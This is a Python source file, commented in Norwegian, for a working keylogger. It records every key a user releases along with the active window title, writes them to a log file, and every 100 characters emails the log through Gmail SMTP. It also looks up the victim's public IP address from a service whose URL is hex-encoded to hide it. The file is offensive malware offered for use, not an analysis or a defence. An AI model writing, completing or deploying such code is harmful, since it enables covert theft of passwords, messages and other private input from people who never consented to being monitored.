import pynput.keyboard as kb
import pygetwindow as gw
import smtplib
import urllib.request
import urllib.parse
import base64
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders


class Keylogger:
    def __init__(self, outPath): #constructor
        self.outPath = outPath #stien til output-filen
        

    def GetIP(self): # Henter din offentlige IP :)
        url = "68747470733a2f2f6964656e742e6d65" #enkoder url i hexformat
        ext_ip = urllib.request.urlopen(bytearray.fromhex(url).decode()).read().decode("utf8") #åpner url og henter IPen 
        return ext_ip

    def SendMail(self, attachment):
        attachment = open(self.outPath, "rb") # åpner filsti i read-only binært format
        username = base64.b64decode("").decode("utf8") #dekoder brukernavn i utf-8 format (ja jeg vet at dette ikke er kryptering)
        password = base64.b64decode("").decode("utf8") #dekoder passord i utf-8 format
        smtpserver = smtplib.SMTP("smtp.gmail.com", 587) # lager smtpserver objekt med smtp-servernavn og port
        smtpserver.ehlo()
        smtpserver.starttls() #TLS kryptering av kommunikasjon mellom klient og smtp-server
        message = MIMEMultipart()
        message.attach(MIMEText("Sender IP = " + self.GetIP())) #Body av eposten
        payload = MIMEBase("application", "octate-stream")
        payload.set_payload((attachment).read()) #setter vedlegg til verdien av attachment
        encoders.encode_base64(payload)
        payload.add_header("Content-Decomposition", "attachment")
        message.attach(payload) 
        try:
            smtpserver.login(username, password) #logger inn på googles smtp server ved bruk av brukernavn og passord
            smtpserver.sendmail(username, username, message.as_string()) # sender mail + vedlegget
        except smtplib.SMTPAuthenticationError as e: #fanger exceptions som blir kastet
            print("ERROR: ",e)
        except smtplib.SMTPRecipientsRefused as e:
            print("ERROR: ",e)
        except smtplib.SMTPConnectError as e:
            print("ERROR: ",e)
        print("Mail sendt!")
        smtpserver.quit()

    def LogKeystrokes(self, key): #denne funksjonen kjøres hver gang OnRelease blir kalt
        log = []
        try:
            if key == kb.Key.space:
                log.append(" ")
            elif key == kb.Key.enter:
                log.append("\t[" + gw.getActiveWindowTitle() + "]\n")
            elif key == kb.Key.backspace:
                log.append("[BACKSPACE]")
            elif key == kb.Key.ctrl_l:
                log.append("[LCTRL]")
            else:
                log.append(str(key))
            with open(self.outPath, "a", encoding="utf-8") as file:
                     for i in log:
                         file.write(i)
            with open(self.outPath, "r", encoding="utf-8") as ffile:
                charCount = len(ffile.read())
                if charCount in range(100, 999999999, 100): # for hver 100 chars sendes filen til meg
                    self.SendMail(self.outPath)
        except FileNotFoundError as e:
                print("ERROR: ", e)
        
        

    def OnRelease(self, key):
            self.LogKeystrokes(key)
            self.SortFile()


    def Listener(self): #denne funksjonen lytter etter tastetrykk
        with kb.Listener(
            on_press = None, #setter til None fordi det skal kun registeres når du slipper tasten
            on_release = self.OnRelease #hver gang du slipper en tast, kjører self.OnRelease
            ) as kbListener:
                kbListener.join() #threading. Lukkes automatisk når programmet avsluttes
                
    def SortFile(self): # Fjerner "'" fra input til fila
        log = []
        newlog = []
        with open(self.outPath, "r", encoding="utf-8") as file:
            for i in file:
                log.append(i)
        for i in log:
            newlog.append(i.replace("'", ""))  
        with open(self.outPath, "w+", encoding="utf-8") as ffile:
            for i in newlog:
                ffile.write(i)

init = Keylogger("")
init.Listener()
